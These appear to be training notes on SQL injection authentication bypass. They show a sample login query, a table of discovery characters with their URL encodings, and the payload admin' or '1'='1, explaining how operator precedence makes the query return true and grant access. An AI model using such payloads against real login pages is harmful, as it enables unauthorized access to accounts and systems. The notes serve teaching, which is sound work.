## Authentication Bypass
* Consider an admin login page with this current SQL query being executed

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

## SQLi Discovery

| **Payload** | **URL Encoded** |
| ----------- | --------------- |
| `' `          | `%27 `            |
| `" `          | `%22 `            |
| `# `          | `%23`             |
| `;  `         | `%3B`             |
|`) `          | `%29`             |

**Note**: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

* We can see an error when injecting an `'` into the login page

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

## OR Injection
* We need the query return true regardless of the username and password entered
* We can abuse the `OR` operator
* An example which is always true: `'1'='1'`
* However, to keep the SQL query working and keep an even number of quotes, so we will remove the last quote and use `'1'='1`

```sql
admin' or '1'='1
```

```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password = 'something';
```

-   If username is `admin`  
    `OR`
-   If `1=1` return `true` 'which always returns `true`'  
    `AND`
-   If password is `something`

![](../../Screenshots/or_inject_diagram.png)

* The `AND` operator will be evaluated first, and it will return `false`
* Then, the `OR` operator would be evalutated, and if either of the statements is `true`, it would return `true`
* Since `1=1` always returns `true`, this query will return `true`, and it will grant us access